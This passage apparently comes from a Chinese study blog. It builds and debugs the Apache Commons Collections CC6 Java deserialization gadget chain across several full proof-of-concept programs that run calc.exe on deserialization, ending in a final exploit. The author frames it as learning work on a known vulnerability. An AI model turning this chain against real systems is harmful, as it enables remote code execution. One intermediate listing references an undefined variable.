class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(map, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"><span class="comment">//        tiedMapEntry.getValue();</span></span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/archives/7db87f98/image-20250620155449352-175245714842399.png" alt="image-20250620155449352"></p><p>虽然弹了计算机，但通过打断点知道其实执行在执行readObject方法前就已经报错了，并没有执行readObject方法，猜测是因为执行put方法时触发hashCode执行了一次exec命令，而exec返回一个Process对象到Map中从而报错</p><p>为了防止这么情况，我们可以先向LazyMap.decorate()传入一个假的ChainedTransformer，这样就算执行put也不会触发exec，然后执行后利用反射将ChainedTransformer改为我们要利用的ChainedTransformer，从而达到我们的效果。</p><p>修改后的poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(map, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>新添加的new ConstantTransformer(1)有隐蔽启动进程日志的作用，也可以不加</p></blockquote><p>虽然现在不会报错了，但也没有弹出计算机</p><p>在HashMap.readObject处下断点：</p><p><img src="/archives/7db87f98/image-20250620163352226-1752457148423100.png" alt="image-20250620163352226"></p><p>可以看到这并不是我们想要的类型的key，而这个key是我们<code>TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,&quot;b1uel0n3&quot;);</code>传入的，但奇怪的是，当我将值改为<code>111</code>等数字时，突然就弹计算机了：</p><p><img src="/archives/7db87f98/image-20250620172948139-1752457148423101.png" alt="image-20250620172948139"></p><p>可以看到这时的key又是TiedMapEntry类型了。</p><p>这就令我有点疑惑，为什么会这样呢？于是我就问ai，还是代码的问题：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 第一种写法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">LazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(LazyMap, <span class="string">&quot;123456789&quot;</span>);</span><br><span class="line">map.put(entry, <span class="string">&quot;b1uel0n3&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 第二种写法</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">LazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, chain);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(LazyMap, <span class="string">&quot;123456789&quot;</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">map1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map1.put(entry, <span class="string">&quot;b1uel0n3&quot;</span>);</span><br></pre></td></tr></table></figure><p>大家可以想一下上面两种写法哪种更好？</p><p>第一种将 TiedMapEntry 放入被 LazyMap 装饰的 map 中，而这个就有个问题就是逻辑有些混乱：</p><p><img src="/archives/7db87f98/image-20250620173657093-1752457148423102.png" alt="image-20250620173657093"></p><p>可以看到已经形成了循环引用：map 包含 entry，entry 又指向 LazyMap，而 LazyMap 又装饰 map。这就会导致键值污染，即当触发反序列化时LazyMap 已被部分初始化（有键值对）而出现问题</p><p>而第二种则是将 TiedMapEntry 放入独立的 map1 中：</p><p><img src="/archives/7db87f98/image-20250624222642486-1752457148423103.png" alt="image-20250624222642486"></p><p>这样不仅逻辑清晰，且map完全干净，则不会出现上诉问题</p><p>所以我们修改下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map1);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但依旧没有弹计算机，下个断点看看：</p><p><img src="/archives/7db87f98/image-20250624223442630-1752457148423104.png" alt="image-20250624223442630"></p><p>那为什么会这样呢，于是我重新看了下每个方法的利用条件，而当我看到LazyMap.get()方法时：<br><img src="/archives/7db87f98/image-20250624225151165-1752457148423105.png" alt="image-20250624225151165"></p><p>只有当访问不存在的键时才会调用，而执行<code>TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,&quot;111&quot;);</code>时其实已经设置了键，我们重新理一遍：</p><p>当反序列化时会调用HashMap.readObject()：</p><p><img src="/archives/7db87f98/image-20250624231311887-1752457148423106.png" alt="image-20250624231311887"></p><p>其中key为<strong>tiedMapEntry</strong>对象，value为”b1uel0n3”，然后调用<strong>HashMap.hash(key)<strong>，触发</strong>key.hashCode()<strong>，即</strong>tiedMapEntry.hashCode()<strong>，tiedMapEntry中map为</strong>LazyMap</strong>，key为”111”，调用**tiedMapEntry.getValue(key)<strong>，然后触发</strong>map.get(key)**，即LazyMap.get(“111”)。但有个问题，<code>map.containsKey(key) == false</code>才调用transform方法，即不存在这个键才能访问，而<code>TiedMapEntry tiedMapEntry=new TiedMapEntry(Lazymap,&quot;111&quot;);</code>将键存在了LazyMap的map中</p><p>所以我们需要把它移除才能触发LazyMap.get()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">innermap.remove(<span class="string">&quot;111&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="/archives/7db87f98/image-20250624232523295-1752457148424107.png" alt="image-20250624232523295"></p><p>成功弹出计算机</p><p>最终poc：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">Runtime</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class);</span><br><span class="line">        InvokerTransformer getRuntime=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer invoke=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;);</span><br><span class="line">        InvokerTransformer exec=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">l</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>);</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;Runtime,getRuntime,invoke,exec,l&#125;;</span><br><span class="line">        ChainedTransformer chain=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line">        Map innermap=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        Map Lazymap=LazyMap.decorate(innermap, chain);</span><br><span class="line">        TiedMapEntry tiedMapEntry=<span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(Lazymap,<span class="string">&quot;111&quot;</span>);</span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(tiedMapEntry,<span class="string">&quot;b1uel0n3&quot;</span>);</span><br><span class="line">        innermap.remove(<span class="string">&quot;111&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field field=chain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(chain,transformers);</span><br><span class="line"></span><br><span class="line">        serialize(map);</span><br><span class="line">        unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileOutputStream out=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(out);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;E:\\study\\web\\java\\test.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(in);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        in.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream -&gt; readObject()</span><br><span class="line">HashMap -&gt; readObject()</span><br><span class="line">HashMap -&gt; hash(key)</span><br><span class="line">TiedMapEntry -&gt; hashCode()</span><br><span class="line">TiedMapEntry -&gt; getValue()</span><br><span class="line">LazyMap -&gt; get()</span><br><span class="line">ChainedTransformer -&gt; transform()</span><br><span class="line">ConstantTransformer -&gt; transform()</span><br><span class="line">InvokerTransformer -&gt; transform()</span><br><span 